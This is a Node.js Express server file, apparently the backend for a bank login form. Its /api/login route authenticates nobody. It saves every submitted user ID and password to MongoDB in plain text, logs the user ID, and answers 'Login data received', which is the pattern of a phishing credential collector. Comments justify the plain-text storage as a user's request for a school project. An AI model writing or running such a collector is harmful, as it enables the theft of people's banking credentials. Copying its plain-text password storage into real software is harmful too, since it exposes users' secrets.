const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from 'public' directory


// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
    .then(() => console.log('MongoDB Connected'))
    .catch(err => console.log(err));

// User Schema (Plain text password as requested for school project)
const UserSchema = new mongoose.Schema({
    userID: {
        type: String,
        required: true
    },
    password: {
        type: String, // Storing as plain text per specific user request
        required: true
    },
    saveID: {
        type: Boolean,
        default: false
    },
    timestamp: {
        type: Date,
        default: Date.now
    }
});

const User = mongoose.model('User', UserSchema);

// Routes
// app.get('/', (req, res) => {
//     res.send('Bank Backend is running');
// });


app.post('/api/login', async (req, res) => {
    const { userID, password, saveID } = req.body;

    try {
        const newUser = new User({
            userID,
            password,
            saveID: !!saveID
        });

        await newUser.save();

        // In a real scenario, we might redirect or return a token. 
        // For this form, we just confirm receipt.
        res.status(200).json({ message: 'Login data received', success: true });
        console.log(`Received login for user: ${userID}`);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error', success: false });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
